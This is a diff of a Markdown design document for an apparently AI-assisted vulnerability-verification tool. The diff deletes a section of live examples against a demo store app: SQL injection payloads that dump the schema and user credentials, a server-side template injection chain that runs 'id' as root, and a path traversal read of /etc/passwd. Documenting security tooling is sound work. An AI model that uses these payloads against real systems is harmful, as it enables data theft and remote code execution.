@@ -140,28 +140,6 @@ Static analysis can only *guess* whether e.g. a SQL injection is exploitable. Th
    - **Relative path resolution**: MCP file-reading tools accept relative paths and filename-suffix fallback
 3. **Verdict & evidence**: outputs `verdict` (confirmed/potential/false_positive), `confidence`, `exploit_payload` and the full evidence chain (baseline vs attack response comparison)
 
-**Live examples** (demo store app):
-
-SQL injection:
-
-| Request | Response | Conclusion |
-|---|---|---|
-| `/?q=xyz` (baseline) | 200 "No products found" | — |
-| `/?q='` | **500** SQL syntax error | injection point confirmed |
-| `/?q=' OR '1'='1` | 200, all 21 products returned (incl. hidden ones) | filter bypassed |
-| `/?q=' UNION SELECT sql FROM sqlite_master--` | full schema leaked | schema readable |
-| `/?q=' UNION SELECT email\|\|':'\|password FROM user--` | user credentials leaked | **data exfiltrated** |
-
-SSTI (multi-step chain + escalation):
-
-| Step | Request | Response |
-|---|---|---|
-| Register/login | POST /auth/register + /auth/login | 302, session established |
-| Order #1 | notes=`{{7*7}}` | receipt page shows **49** (template evaluated) |
-| Escalate | notes=`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` | receipt page shows **uid=0(root)** |
-
-Path traversal (auth-gated): after logging in as admin/admin123 (a seeded test account), `GET /admin/logs?path=/etc/passwd` returns the full passwd file (432 bytes vs 108-byte baseline log).
-
 ### 4.1 Verdict Collection
 
 After the AI finishes building payloads and simulating attacks, final verdicts are written back to the UI fields uniformly:
